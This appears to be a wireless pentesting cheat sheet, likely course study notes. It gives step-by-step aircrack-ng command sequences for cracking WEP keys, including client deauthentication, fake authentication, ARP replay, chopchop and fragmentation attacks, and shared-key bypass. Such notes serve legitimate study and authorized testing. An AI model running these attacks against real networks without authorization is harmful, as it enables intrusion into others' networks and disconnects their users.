# Recon

```
Determine Used Driver
To determine if we are using ieee80211 or mac80211 drivers use this command:
If it says “nl80211 not found.” that means we are using ieee80211 drivers. Else we are using mac80211 and the “iw list” output will print wireless card informations.

root@wifu:~# iw list
nl80211 not found.
```

```
Display SSID and their Channel – mac80211 driver
To display access point names and their corresponding channel number with mac80211 drivers use the following syntax:

root@wifu:~# iw dev wlan0 scan | egrep "DS\ Parameter\ set|SSID"
  SSID: wifu  
  DS Parameter set: channel 3  
  SSID: 6F36E6  
  DS Parameter set: channel 1

Display SSID and their Channel – ieee80211 driver
To display access point names and their corresponding channel number with ieee80211 drivers use the following syntax:

root@wifu:~# iwlist wlan0 scanning | egrep "ESSID|Channel"
                     ESSID:"wifu"
                     Channel:3
                     ESSID:"6F36E6"
                     Channel:11
```

```
Display wireless card MAC address
To display your wireless card MAC address, use the following syntax:

root@wifu:~# macchanger -s mon0
Current MAC: <MAC address> <(Device information)>
```

```
Increase TX Power
Note : TX power depends on your country

Increse the TX power of wlan0
root@wifu:~# iw reg set B0
root@wifu:~# iwconfig wlan0 <txpower> <NmW|NdBm|off|auto>

Verify change
root@wifu:~# iwconfig wlan0
```

```
Cracking Wep
WEP – With connected Clients
Place your wireless card into monitor mode on the channel number of the AP:
airmon-ng start <interface> <AP channel>

Start an Airodump-ng capture filtering on the AP channel and BSSID, saving the file to disk:
airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>

Conduct a fake authentication attack against the AP:
aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>

Launch the ARP request replay attack:
aireplay-ng -3 -b <AP MAC> -h <Your MAC> <interface>

Deauthenticate the connected client to force new IV generation by the AP:
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>

Once a significant number of IVs have been captured, run Aircrack-ng against the Airodump capture:
aircrack-ng <capture>
```

```
WEP – Via a Client
Place your wireless card into monitor mode on the AP channel:
airmon-ng start <interface> <AP channel>

Start a capture dump, filtering on the AP channel and BSSID, saving the capture to a file:
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>

Next, conduct a fake authentication against the access point:
aireplay-ng -0 1 -e <ESSID> -a <AP MAC> -w <capture> <interface>

Launch the interactive packet replay attack looking for ARP packets coming from the AP:
aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <interface>

Once enough IVs have been captured, crack the WEP key:
aircrack-ng -z <capture>
```

```
WEP – Clientless
Place your wireless card into monitor mode on the channel number of the AP:
airmon-ng start <interface> <AP channel>

Conduct a fake authentication attack against the AP:
aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>

Run attack 4, the KoreK chopchop attack (or attack 5, the fragmentation attack):
KoreK Chop Chop Attack
aireplay-ng -4 -b <AP MAC> -h <Your MAC> <interface>

Fragmentation Attack
aireplay-ng -5 -b <AP MAC> -h <Your MAC> <interface>

Craft an ARP request packet using packetforge-ng:
packetforge-ng -0 -a <AP MAC> -h <Your MAC> -l <Source IP> -k <Dest IP> -y <xor filename> -w <output filename>

Inject the packet into the network using attack 2, the interactive packet replay attack:
aireplay-ng -2 -r <packet filename> <interface>

Crack the WEP key using Aircrack-ng:
aircrack-ng <capture>
```

```
WEP – Bypassing Shared Key Authentication
Place your wireless card into monitor mode on the channel number of the AP:
airmon-ng start <interface> <AP channel>

Start an Airodump-ng capture, filtering on the AP channel and BSSID, saving the capture:
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>

Deauthenticate the connected client to capture the PRGA XOR keystream:
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>

Conduct a fake shared key authentication using the XOR keystream:
aireplay-ng -1 0 -e <ESSID> -y <keystreamfile> -a <AP MAC> -h <Your MAC> <interface>

Launch the ARP request replay attack:
aireplay-ng -3 -b <AP MAC> -h <Your MAC> <interface>

Deauthenticate the victim client again to force the generation of an ARP packet:
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>

Once IVs are being generated by the AP, run Aircrack-ng against the capture:
aircrack-ng <capture>
```

Troubleshooting

During a Sharing Key Authentication Bypass attack, if once you deauthenticate a client you got a “Broken SKA” message instead of the “140 bytes keystream : ” into your Airodump output. Try to restart the Airodump-ng capture and deauthenticate another client.


